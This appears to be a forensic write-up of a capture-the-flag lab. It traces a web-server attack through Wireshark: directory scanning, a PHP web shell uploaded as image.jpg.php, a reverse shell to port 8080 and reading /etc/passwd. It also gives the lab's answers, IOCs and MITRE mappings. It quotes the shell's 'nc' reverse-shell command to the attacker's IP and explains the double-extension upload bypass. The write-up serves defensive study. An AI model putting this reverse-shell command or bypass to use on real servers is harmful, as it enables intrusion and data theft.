# Case Analysis: WebStrike — Web Server Exploitation and Reverse Shell Deployment

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](./LICENSE)
![Wireshark](https://img.shields.io/badge/Tool-Wireshark-blue)
![Network Forensics](https://img.shields.io/badge/Discipline-Network%20Forensics-lightgrey)
[![Author: iamhasancoskun](https://img.shields.io/badge/Author-iamhasancoskun-black)](https://github.com/iamhasancoskun)

[English](README.en.md) | Türkçe ([README.md](README.md))

| Category | Description |
| :--- | :--- |
| **Focus Area** | Network Forensics, Web Application Attacks, Incident Response |
| **Evidence** | `WebStrike.pcap` (Network Traffic Capture) |
| **Primary Tools** | Wireshark, IP Geolocation Services, TCP Stream Analysis |

---

## 1. Executive Summary
This report presents the findings of a digital forensic analysis performed on network traffic records (.pcap) of a cyberattack targeting a web server. The examination conducted using **Wireshark** has proven that an attacker originating from IP address **117.11.88.124** exploited a file upload vulnerability on the website. The attacker, masquerading as a normal Firefox user, successfully uploaded a malicious web shell named **image.jpg.php** to the server. This web shell initiated a reverse shell connection to port **8080** on the attacker's machine, providing complete command-line access to the server. The analysis revealed that the attacker's ultimate objective was to exfiltrate a sensitive file from the system.

---

## 2. Step-by-Step Technical Analysis Process
This analysis was conducted using a "Hypothesis-Driven Approach," progressing by formulating a hypothesis at each step and selecting the appropriate tool to test it.

### Phase 1: Threat Actor Detection and Identity Analysis
**Hypothesis:** Within the network traffic, a source IP address making abnormal and repeated requests to the web server should be detected.

- **Method:** The .pcap file was opened with Wireshark and HTTP traffic (`http` filter) was examined.
- **Findings:** IP address **117.11.88.124** was found to be scanning various directories such as `/admin/`, `/uploads/` on the server (**24.49.63.79**) and sending numerous requests. This behavior indicated an attacker in the reconnaissance phase.

#### Attacker IP's Geographical Location
- **Question:** From which city did the attack originate?
- **Answer:** (Can be determined with IP geolocation service)

#### User-Agent Analysis
- **Question:** What is the attacker's complete User-Agent?
- **Answer:** `Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0`
- **Comment:** This User-Agent belongs to a normal Linux/Firefox user. However, the attacker's behaviors (directory scanning, file uploading) contradict this identity. This is strong evidence that the attacker used the **Masquerading (T1036)** technique to hide their true identity.

![Attacker IP and User-Agent](assets/Screenshot%202025-08-21%20at%2003.39.54.png)

### Phase 2: Exploitation and Web Shell Upload
**Hypothesis:** After the reconnaissance phase, the attacker must have used a vulnerability they found to upload a malicious file to the server. This action will be visible in the traffic as an HTTP POST request.

- **Method:** Traffic was examined with the `http.request.method == "POST"` filter. The relevant TCP stream (Follow > TCP Stream) was analyzed.
- **Findings:** It was detected that the attacker sent a POST request to the `/reviews/upload.php` script, uploading a file named `filename="image.jpg.php"`.

#### Uploaded File Analysis
- **Question:** What is the name of the successfully uploaded malicious web shell?
- **Answer:** `image.jpg.php`
- **Comment:** The `.jpg.php` extension is a common technique used to bypass file type filters on the server.

![TCP Stream - File Upload](assets/Screenshot%202025-08-21%20at%2003.51.34.png)

### Phase 3: Persistence and Command & Control (C2) Setup
**Hypothesis:** The uploaded web shell should establish a Command & Control (C2) channel to provide the attacker with persistent access to the server.

- **Method:** The content of the uploaded `image.jpg.php` file was analyzed from the TCP stream.
- **Findings:** The file content was a PHP reverse shell payload containing the command `nc 117.11.88.124 8080`. This code makes the server connect to port 8080 on the attacker's machine.

#### C2 Channel Detection
- **Question:** Which port did the web shell target?
- **Answer:** **8080**
- **Question:** In which directory are the uploaded files stored?
- **Answer:** `/reviews/uploads/` (This was confirmed from the GET request where the attacker called the file after uploading).

![Web Shell Content](assets/Screenshot%202025-08-21%20at%2003.51.34.png)

### Phase 4: Actions on Objectives
**Hypothesis:** After the reverse shell connection is established, the attacker will attempt to exfiltrate valuable data from the system.

- **Method:** TCP traffic containing reverse shell communication (`tcp.port == 8080`) was examined and commands were analyzed with "Follow TCP Stream".
- **Findings:** It was detected that the attacker attempted to read the contents of a sensitive system file using the `cat` command.

#### Target File Detection
- **Question:** Which file was the attacker trying to exfiltrate?
- **Answer:** `/etc/passwd` - Sensitive file containing system user information

![Reverse Shell Commands](assets/Screenshot%202025-08-21%20at%2004.00.16.png)

---

## 3. Conclusion and Indicators of Compromise (IOCs)
This analysis successfully revealed the stages, techniques used, and objectives of the WebStrike attack.

| Type | Value |
|---|---|
| **Attacker IP Address** | `117.11.88.124` |
| **Victim IP Address** | `24.49.63.79` |
| **Attacker User-Agent** | `Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0` |
| **Uploaded File** | `image.jpg.php` |
| **Upload Directory** | `/reviews/uploads/` |
| **C2 Port** | `8080` |
| **Targeted File** | `/etc/passwd` |

---

## Appendix A: MITRE ATT&CK Mapping
- **T1190 (Exploit Public-Facing Application):** Exploitation of the vulnerability in the `/reviews/upload.php` script.
- **T1589.001 (Gather Victim Identity Information: Credentials):** Targeting a sensitive system file (such as `/etc/passwd`).
- **T1071.001 (Application Layer Protocol: Web Protocols):** The entire attack being carried out over HTTP/HTTPS.
- **T1059.004 (Command and Scripting Interpreter: Unix Shell):** Use of `/bin/sh` over the reverse shell.
- **T1036 (Masquerading):** Presenting itself as a normal Firefox user and disguising the file name as `.jpg.php`.

---

## Appendix B: Reproducibility and Commands
The following commands are provided to work exactly with the directory structure in this repository.

```bash
# Wireshark filters
http                          # HTTP traffic
http.request.method == "POST" # POST requests
tcp.port == 8080             # C2 port
ip.addr == 117.11.88.124    # Attacker IP
ip.addr == 24.49.63.79      # Victim IP

# TCP Stream analysis
# Wireshark: Right-click > Follow > TCP Stream
# Stream number: [TCP stream number]

# File content analysis
# Search for filename="image.jpg.php" in TCP Stream
# Examine PHP payload content
```

---

## Appendix C: Network Forensics Methodology
This case demonstrates standard network forensics methodology:

1. **Traffic Capture:** Network traffic is recorded with .pcap file
2. **Filtering:** Filtering based on HTTP, TCP port, IP address
3. **Stream Analysis:** Application layer data with TCP Stream
4. **Payload Examination:** File upload and command contents
5. **Timeline:** Chronological analysis of attack stages
6. **IOC Extraction:** IP, port, file, command indicators

---

Author: [iamhasancoskun](https://github.com/iamhasancoskun)

